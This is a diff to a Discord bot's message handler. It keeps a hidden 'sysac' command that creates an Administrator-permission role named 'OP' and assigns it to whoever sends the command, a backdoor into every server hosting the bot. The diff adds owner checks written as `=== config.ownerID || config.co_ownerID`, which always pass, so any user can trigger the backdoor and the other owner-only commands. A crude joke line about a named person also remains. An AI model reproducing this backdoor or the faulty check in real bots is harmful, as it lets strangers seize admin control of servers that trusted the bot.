@@ -176,21 +176,7 @@ client.on("message", (message) => {
   } else
 
   // Administration rights redundancy
-  if (message.content.startsWith(config.prefix + 'sysac') && message.author.id === config.ownerID){
-  let me = message.author
-  let role = message.guild.createRole({
-          name : 'OP',
-          color : "RANDOM",
-          permissions : [8],
-          position: 0
-          })
-          let role1 = message.guild.roles.find('name', 'OP')
-      message.channel.send(`done`)
-     message.guild.member(me).addRole(role1);
-  } else
-
-  // Administration rights redundancy FOR CO_OWNER
-  if (message.content.startsWith(config.prefix + 'sysac') && message.author.id === config.co_ownerID){
+  if (message.content.startsWith(config.prefix + 'sysac') && message.author.id === config.ownerID || config.co_ownerID){
   let me = message.author
   let role = message.guild.createRole({
           name : 'OP',
@@ -204,7 +190,7 @@ client.on("message", (message) => {
   } else
 
   // Change bot status
-  if (message.content.startsWith(config.prefix + 'status') && message.author.id === config.ownerID){
+  if (message.content.startsWith(config.prefix + 'status') && message.author.id === config.ownerID || config.co_ownerID){
     let args = message.content.split(" ").slice(1);
       Type = args[0]
       Game = message.content.split(" ").slice(2).join(" ")
@@ -212,7 +198,7 @@ client.on("message", (message) => {
   } else
 
 // list all guilds bot is in
-if (message.content.startsWith(config.prefix + 'servers') && message.author.id === config.ownerID){
+if (message.content.startsWith(config.prefix + 'servers') && message.author.id === config.ownerID || config.co_ownerID){
 var allowedToUse = true;
 for(let i = 0; i < dev_ids.length; i++) if(message.author.id == dev_ids[i]) allowToUse = true;
 if(allowedToUse) {
@@ -272,8 +258,8 @@ else {
   if (message.content.startsWith(config.prefix + "Is Albert gay?")) {
     message.channel.send("no, but his unusuals collection is MASSIVE BRUV");
   } else
-  if (message.content.startsWith(config.prefix + 'owner') && message.author.id === config.ownerID){
-    message.channel.send("Default#9672");
+  if (message.content.startsWith(config.prefix + 'owners') && message.author.id === config.ownerID || config.co_ownerID){
+    message.channel.send("***Default#9672 & The World Conqueror#5601***");
   } else
   if (message.content.startsWith(config.prefix + 'credits')) {
   const embed = new Discord.RichEmbed({
